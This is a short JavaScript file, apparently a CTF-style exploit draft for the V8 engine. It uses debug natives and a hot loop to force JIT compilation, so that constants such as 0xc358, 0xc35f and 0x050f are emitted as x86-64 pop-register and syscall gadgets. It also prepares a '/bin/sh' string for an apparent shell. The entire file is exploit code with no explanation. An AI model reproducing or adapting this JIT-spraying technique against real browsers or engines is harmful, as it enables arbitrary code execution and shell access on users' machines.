var array = new Uint8Array();
// %DebugPrint(array);
const shell = "/bin/sh\0";
function jsc(x, var1, var2, var3, var4) {
    if (x == 0)
        %SystemBreak();
    var b = var2 % 0xc2;
    var d = var2 - 0xc2;
    var e = var2 ^ 0xc2;
    array[0xc358] = var1;
    array[0xc35f] = var1;
    array[0xc35a] = var1;
    array[0xc35e] = var1;
    array[0x050f] = var1;
    var extra = e + 0xc305;
    // array[e + 0x5] = 0xc3;
    array[0x5] = 0xc3;
    var result = b + d + e + extra;
    return result + shell;
}

for (var i = 0; i < 0x1000; ++i) {
    array[i] = 0x1;
}

//var tmp = 0;
for (var i = 0; i < 0x10000; i++) {
    jsc(1, 0xc3, 0xc22, 0xc32, 0xc55);
}


jsc(0, 0xc3, 0xc22, 0xc32, 0xc55);